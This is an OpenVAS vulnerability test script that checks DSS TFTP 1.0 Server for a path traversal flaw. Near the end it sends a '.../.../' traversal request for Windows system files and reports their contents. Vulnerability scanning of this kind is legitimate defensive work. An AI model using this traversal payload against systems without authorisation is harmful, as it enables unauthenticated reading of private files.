###############################################################################
# OpenVAS Vulnerability Test
#
# DSS TFTP Server Path Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105957");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2015-03-04 09:41:51 +0700 (Wed, 04 Mar 2015)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("DSS TFTP Server Path Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=1440");

  script_tag(name:"summary", value:"DSS TFTP Server is prone to a path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted GET request and checks if it can
  download some system files.");

  script_tag(name:"insight", value:"DSS TFTP 1.0 Server is a simple TFTP server that allows user
  to download/upload files through the TFTP service from/to specified tftp root directory. The application
  is vulnerable to path traversal that enables attacker to download/upload files outside the tftp
  root directory.");

  script_tag(name:"impact", value:"Unauthenticated attackers can download/upload arbitrary files
  outside the tftp root directory.");

  script_tag(name:"affected", value:"DSS TFTP 1.0 Server and below.");

  script_tag(name:"solution", value:"No known solution was made available for at
  least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("tftp.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_has_reliable_get(port:port))
  exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  res = tftp_get(port:port, path:".../.../.../.../.../.../.../" + files[file]);
  if(!res)
    continue;

  if(egrep(pattern:file, string:res, icase:TRUE)) {
    report = string("The " + files[file] + " file contains:\n", res);
    security_message(port:port, data:report, proto:"udp");
    exit(0);
  }
}

exit(99);
